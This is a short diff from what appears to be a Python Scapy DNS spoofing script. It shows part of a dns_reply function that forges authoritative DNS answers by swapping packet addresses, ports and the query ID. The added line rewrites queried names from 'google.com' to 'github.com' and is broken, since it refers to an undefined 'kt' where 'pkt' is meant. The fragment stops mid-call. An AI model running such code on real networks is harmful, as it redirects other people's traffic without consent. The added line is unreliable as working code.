@@ -14,6 +14,7 @@ except KeyboardInterrupt:
 
 
 def dns_reply(pkt):
+    spoofedn=kt[DNS].qd.qname.replace("google.com","github.com")
     spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
         UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
         DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, qr=1, \
